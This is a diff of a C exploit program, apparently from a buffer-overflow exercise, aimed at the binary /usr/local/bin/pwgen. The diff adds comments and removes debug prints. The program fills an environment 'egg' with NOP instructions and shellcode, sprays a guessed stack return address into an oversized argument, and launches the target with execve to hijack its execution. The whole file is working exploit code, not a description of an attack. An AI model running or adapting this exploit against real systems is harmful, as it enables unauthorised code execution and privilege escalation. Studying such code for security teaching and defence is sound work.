@@ -22,7 +22,6 @@ int main(int argc, char* argv[]){
 	char *newenv[] = { NULL, NULL, NULL};
 	char exename[] = "/usr/local/bin/pwgen";
 
-	
 	if(argc >1) bsize = atoi(argv[1]);
 	if(argc >2) offset = atoi(argv[2]);
 	if(argc >3)eggsize = atoi(argv[3]);
@@ -37,18 +36,21 @@ int main(int argc, char* argv[]){
 		exit(0);
 	}
 
+	//Calbulate the address the egg shell may be
 	addr = get_sp() - offset;
-	//printf("Using address: 0x%x\n", addr);
 
+	//Fill the buff with the egg address
 	ptr = buff;
 	addr_ptr = (long*)ptr;
 	for(i=0; i < bsize; i+=4)
 		*(addr_ptr++) = addr;
-
+	
+	//Fill the egg with NOP instructions.
 	ptr = egg;
 	for(i=0; i < eggsize - strlen(shellcode) - 1;i++)
 		*(ptr++) = NOP;
 
+	//Fill the last part of eggshell with shellcode.
 	for(i=0; i < strlen(shellcode);i++)
 		*(ptr++) = shellcode[i];
 
@@ -59,13 +61,10 @@ int main(int argc, char* argv[]){
 	memcpy(buff, "-s  ",4);
 
 	newenv[0] = egg;
-       // newenv[1] = buff;
-	//printf("%i,%i\n", strlen(newenv[0]), strlen(newenv[1]));
-	//printf("%s\n%s\n", newenv[0], newenv[1]);
 	putenv(egg);
 	putenv(buff);
 	newargv[1] = buff;
-	//printf("argv[1]:%s\n", newargv[1]);
+
 	execve(exename, newargv, newenv);
 	perror("execve");
 	exit(0);
